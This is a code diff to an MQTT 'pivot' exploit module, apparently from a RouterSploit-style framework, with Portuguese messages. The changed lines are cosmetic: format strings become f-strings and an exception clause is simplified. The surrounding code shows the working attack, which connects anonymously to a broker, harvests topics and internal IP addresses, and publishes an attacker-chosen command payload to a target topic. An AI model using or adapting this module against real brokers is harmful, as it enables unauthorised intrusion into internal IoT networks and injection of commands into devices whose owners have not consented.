@@ -154,10 +154,10 @@ class Exploit(Exploit):
     @multi
     def run(self):
         """Pivot MQTT: enumera dispositivos internos e injeta comando no alvo."""
-        print_status("Conectando ao broker MQTT em {}:{}".format(self.target, self.port))
+        print_status(f"Conectando ao broker MQTT em {self.target}:{self.port}")
 
         if not self.check():
-            print_error("Broker rejeitou conexão anônima em {}:{}".format(self.target, self.port))
+            print_error(f"Broker rejeitou conexão anônima em {self.target}:{self.port}")
             return
 
         print_success("Broker aceita conexões anônimas")
@@ -166,8 +166,8 @@ class Exploit(Exploit):
         sock.settimeout(self._RECV_TIMEOUT)
         try:
             sock.connect((str(self.target), int(self.port)))
-        except (socket.error, OSError) as exc:
-            print_error("Falha na conexão: {}".format(exc))
+        except OSError as exc:
+            print_error(f"Falha na conexão: {exc}")
             return
 
         sock.sendall(self._build_connect_packet("wxf-pivot"))
@@ -186,7 +186,7 @@ class Exploit(Exploit):
         discovered_topics = set()
         discovered_ips = set()
 
-        print_status("Escutando mensagens ({} segundos)...".format(self._ENUM_DURATION))
+        print_status(f"Escutando mensagens ({self._ENUM_DURATION} segundos)...")
         deadline = time.time() + self._ENUM_DURATION
         while time.time() < deadline:
             try:
@@ -203,7 +203,7 @@ class Exploit(Exploit):
                 discovered_ips.update(self._extract_internal_ips(combined))
 
         if discovered_topics:
-            print_success("{} tópico(s) descoberto(s)".format(len(discovered_topics)))
+            print_success(f"{len(discovered_topics)} tópico(s) descoberto(s)")
             print_table(["Tópico"], *[(t,) for t in sorted(discovered_topics)[:30]])
         else:
             print_warning("Nenhuma mensagem capturada na janela de enumeração")
@@ -212,7 +212,7 @@ class Exploit(Exploit):
             print_success("IPs internos encontrados em tópicos/payloads:")
             for ip in sorted(discovered_ips):
                 marker = " [ALVO PIVOT]" if ip == str(self.pivot_target) else ""
-                print_info("  {}{}".format(ip, marker))
+                print_info(f"  {ip}{marker}")
 
         if not self.pivot_topic or not self.pivot_payload:
             print_warning("pivot_topic/pivot_payload não configurados; ignorando injeção de comando")
@@ -220,10 +220,9 @@ class Exploit(Exploit):
             sock.close()
             return
 
-        print_status("Publicando payload pivot em tópico: {}".format(self.pivot_topic))
+        print_status(f"Publicando payload pivot em tópico: {self.pivot_topic}")
         sock.sendall(self._build_publish_packet(str(self.pivot_topic), str(self.pivot_payload), qos=0))
-        print_success("Payload publicado em '{}' via broker {}:{}".format(
-            self.pivot_topic, self.target, self.port))
+        print_success(f"Payload publicado em '{self.pivot_topic}' via broker {self.target}:{self.port}")
 
         sock.sendall(self._build_disconnect_packet())
         sock.close()
